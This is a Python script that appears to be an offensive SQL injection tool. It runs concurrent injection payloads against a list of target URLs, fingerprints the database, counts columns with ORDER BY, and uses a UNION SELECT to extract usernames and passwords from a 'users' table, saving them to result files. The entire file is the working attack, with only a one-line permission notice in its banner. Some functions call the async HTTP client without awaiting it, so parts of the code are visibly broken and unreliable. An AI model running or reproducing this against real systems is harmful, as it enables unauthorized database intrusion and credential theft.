#!/usr/bin/env python3
"""
inject.py

Enhanced SQL Injection Testing Framework v2.2

Author: ZnX Pentester
"""

# Banner display
BANNER = r"""
███████╗ ██████╗ ██╗     ██████╗ ███████╗███╗   ██╗████████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║     ███████╗██║ ╚████║   ██║   ███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                     SQL Injection Testing Framework
              Use only on systems you have permission to test!

                    ZnX Pentester - v2.2
"""

import asyncio
import json
import logging
import os
import sys
import re
import time
from typing import Any, Dict, List, Optional, Tuple, Union
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx
import typer
from bs4 import BeautifulSoup

app = typer.Typer(help="SQL Injection Testing Framework - ZnX v2.2")

# Configure logging
class VerboseFilter(logging.Filter):
    def filter(self, record):
        return not getattr(record, 'verbose_only', False)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# ----------------------------
# Helper Functions
# ----------------------------

def load_json(path: str) -> Any:
    with open(path, 'r') as f:
        return json.load(f)


def write_results(host: str, lines: List[str]) -> None:
    os.makedirs('results', exist_ok=True)
    filepath = os.path.join('results', f"{host}.txt")
    with open(filepath, 'w') as fw:
        fw.write("\n".join(lines))
    logger.info(f"Result written: {filepath}")


def fingerprint_dbms(response: httpx.Response, elapsed: float, time_threshold: float = 3.0) -> str:
    text = response.text.lower()
    if any(x in text for x in ['mysql', 'you have an error in your sql syntax']):
        return 'mysql'
    if any(x in text for x in ['syntax error at or near', 'pg_sleep', 'pgsql']):
        return 'postgresql'
    if any(x in text for x in ['oracle', 'ora-']):
        return 'oracle'
    if any(x in text for x in ['microsoft sql', 'incorrect syntax near']):
        return 'mssql'
    if elapsed >= time_threshold:
        return 'unknown-time'
    return 'unknown'


def get_form_csrf(html: str) -> Tuple[Dict[str,str], str]:
    """Extract CSRF token from first form if exists"""
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    token_data = {}
    action = form.get('action') if form else ''
    if form:
        for inp in form.find_all('input', {'type': 'hidden'}):
            name = inp.get('name')
            val = inp.get('value', '')
            token_data[name] = val
    return token_data, action


def detect_column_count(base_url: str, payload: str, client: httpx.AsyncClient, timeout: int) -> int:
    """Discover number of columns via ORDER BY technique"""
    count = 1
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)
    param = list(qs.keys())[0]
    while count <= 10:
        test_payload = f"' ORDER BY {count}--"
        qs[param] = qs[param][0] + test_payload
        url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        try:
            r = client.get(url, timeout=timeout)
            if r.status_code >= 500:
                return count - 1
        except:
            return count - 1
        count += 1
    return count - 1


def extract_union_data(dbms: str, base_url: str, client: httpx.AsyncClient, timeout: int) -> Tuple[Optional[str], Optional[str]]:
    """Perform UNION-based extraction after discovering column count"""
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)
    columns = detect_column_count(base_url, '', client, timeout)
    nulls = ','.join('NULL' for _ in range(columns - 2))
    select_cols = 'username,password'
    payload = f"' UNION SELECT {nulls},{select_cols} FROM users--"
    param = list(qs.keys())[0]
    qs[param] = qs[param][0] + payload
    url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
    try:
        r = client.get(url, timeout=timeout)
        # crude parse
        match = re.search(r"(\w+),(\w+)", r.text)
        if match:
            return match.group(1), match.group(2)
    except:
        pass
    return None, None


async def test_request(
    method: str,
    url: str,
    data: Optional[Dict[str,Any]],
    json_data: Optional[Dict[str,Any]],
    headers: Dict[str,str],
    payloads: Dict[str,List[str]],
    client: httpx.AsyncClient,
    timeout: int,
    verbose: bool
) -> Optional[Dict[str,Any]]:
    # baseline
    start = time.time()
    base_resp = await client.request(method, url, data=data, json=json_data, headers=headers, timeout=timeout)
    base_time = time.time() - start
    base_len = len(base_resp.text)
    # csrf token injection
    csrf_tokens, form_action = get_form_csrf(base_resp.text)
    for inj_type, plist in payloads.items():
        for p in plist:
            test_data, test_json = data.copy() if data else {}, json_data.copy() if json_data else {}
            hdrs = headers.copy()
            # choose injection location
            if json_data:
                for k in test_json:
                    test_json[k] = str(test_json[k]) + p
            elif data:
                for k in test_data:
                    test_data[k] = str(test_data[k]) + p
            else:
                # GET param
                parsed = urlparse(url)
                qs = parse_qs(parsed.query)
                param = list(qs.keys())[0]
                qs[param] = qs[param][0] + p
                url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            # add csrf
            if csrf_tokens and data is not None:
                test_data.update(csrf_tokens)
            # send request
            t0 = time.time()
            try:
                r = await client.request(method, url, data=test_data or None, json=test_json or None, headers=hdrs, timeout=timeout)
            except Exception:
                continue
            elapsed = time.time() - t0
            dbms = fingerprint_dbms(r, elapsed)
            if verbose:
                logger.info(f"Injected [{inj_type}] payload: {p}", extra={'verbose_only':True})
            # conditions
            if inj_type == 'boolean' and len(r.text) != base_len:
                user, pwd = extract_union_data(dbms, url, client, timeout)
            elif inj_type == 'time' and elapsed > base_time + 3:
                user, pwd = extract_union_data(dbms, url, client, timeout)
            elif inj_type == 'error' and dbms != 'unknown':
                user, pwd = extract_union_data(dbms, url, client, timeout)
            else:
                continue
            return {'url': url, 'dbms': dbms, 'type': inj_type, 'username': user, 'password': pwd}
    return None

async def run_scan(
    targets: List[str],
    payloads: Dict[str,List[str]],
    concurrency: int,
    timeout: int,
    proxy: Optional[str],
    verbose: bool
) -> List[Dict[str,Any]]:
    semaphore = asyncio.Semaphore(concurrency)
    client_args: Dict[str,Any] = {'timeout': timeout}
    if proxy:
        client_args['proxies'] = proxy
    async with httpx.AsyncClient(**client_args) as client:
        tasks = []
        for target in targets:
            method = 'GET'
            data = None
            json_data = None
            headers = {}
            parsed = urlparse(target)
            if 'post:' in target:
                _, actual = target.split('post:')
                method = 'POST'
                # expected format: url|key1=val1&key2=val2
                url, body = actual.split('|',1)
                data = dict(pair.split('=') for pair in body.split('&'))
            if 'json:' in target:
                _, actual = target.split('json:')
                method = 'POST'
                url, body = actual.split('|',1)
                json_data = json.loads(body)
                headers['Content-Type'] = 'application/json'
            async def sem(u=target, m=method, d=data, j=json_data, h=headers):
                async with semaphore:
                    return await test_request(m, u, d, j, h, payloads, client, timeout, verbose)
            tasks.append(sem())
        results = await asyncio.gather(*tasks)
    return [r for r in results if r]

@app.command()
def main(
    targets_file: str = typer.Option(..., '--targets', help="Path to targets.txt"),
    payloads_file: str = typer.Option('payloads.json', '--payloads', help="Path to payloads.json"),
    concurrency: int = typer.Option(10, '--concurrency', help="Max parallel requests"),
    timeout: int = typer.Option(5, '--timeout', help="Request timeout (s)"),
    proxy: Optional[str] = typer.Option(None, '--proxy', help="HTTP proxy URL"),
    summary: bool = typer.Option(False, '--summary', help="Generate summary file"),
    verbose: bool = typer.Option(False, '--verbose', help="Verbose debug output")
):
    """Execute enhanced SQLi scan against target URLs."""
    print(BANNER)
    targets = [line.strip() for line in open(targets_file) if line.strip()]
    payloads = load_json(payloads_file)
    if verbose:
        logger.setLevel(logging.DEBUG)
    logger.info(f"Starting scan on {len(targets)} targets (concurrency={concurrency})")
    results = asyncio.run(run_scan(targets, payloads, concurrency, timeout, proxy, verbose))
    summaries: List[str] = []
    for r in results:
        host = urlparse(r['url']).hostname or 'unknown'
        lines = [
            f"[+] URL: {r['url']}",
            f"[+] DBMS: {r['dbms']}",
            f"[+] Injection: {r['type']}",
            f"[+] username: {r.get('username')}",
            f"[+] password: {r.get('password')}"
        ]
        write_results(host, lines)
        summaries.append("\n".join(lines))
    if summary and summaries:
        os.makedirs('results', exist_ok=True)
        with open('results/summary.txt', 'w') as sf:
            sf.write("\n\n".join(summaries))
        logger.info("Summary written: results/summary.txt")

if __name__ == '__main__':
    app()
